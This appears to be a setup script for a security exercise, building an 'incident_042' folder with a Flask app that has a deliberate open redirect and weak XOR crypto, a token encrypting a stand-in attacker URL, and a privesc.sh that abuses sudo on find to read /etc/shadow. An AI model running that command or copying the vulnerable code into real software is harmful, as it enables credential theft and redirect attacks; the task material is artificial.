#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest flask

    mkdir -p /home/user/incident_042

    cat << 'EOF' > /home/user/incident_042/app.py
from flask import Flask, request, redirect
import binascii

app = Flask(__name__)

# Proprietary crypto function written by the intern
def encrypt_url(url: str, key: bytes) -> str:
    # Key is loaded from an environment variable in production
    url_bytes = url.encode('utf-8')
    encrypted = bytes([url_bytes[i] ^ key[i % len(key)] for i in range(len(url_bytes))])
    return binascii.hexlify(encrypted).decode('ascii')

def decrypt_url(hex_str: str, key: bytes) -> str:
    encrypted = binascii.unhexlify(hex_str)
    decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
    return decrypted.decode('utf-8')

@app.route('/login')
def login():
    # Login logic omitted
    next_url_encrypted = request.args.get('next')
    if next_url_encrypted:
        # Vulnerable to Open Redirect and uses custom weak XOR crypto
        # In production, app.secret_key is a random 8-byte string
        try:
            next_url = decrypt_url(next_url_encrypted, app.secret_key)
            return redirect(next_url)
        except:
            pass
    return "Logged in!"
EOF

    python3 -c "
import binascii
url = 'https://evil-corp.xyz/login_bypass'
key = b'S3cr3tK!'
url_bytes = url.encode('utf-8')
encrypted = bytes([url_bytes[i] ^ key[i % len(key)] for i in range(len(url_bytes))])
with open('/home/user/incident_042/auth_token.txt', 'w') as f:
    f.write(binascii.hexlify(encrypted).decode('ascii'))
"

    cat << 'EOF' > /home/user/incident_042/privesc.sh
#!/bin/bash
# Found the system allows passwordless sudo for the find command!
sudo /usr/bin/find /home -name "*.txt" -exec /bin/sh -c 'cat /etc/shadow' \;
EOF

    useradd -m -s /bin/bash user || true
    chown -R user:user /home/user/incident_042
    chmod -R 777 /home/user
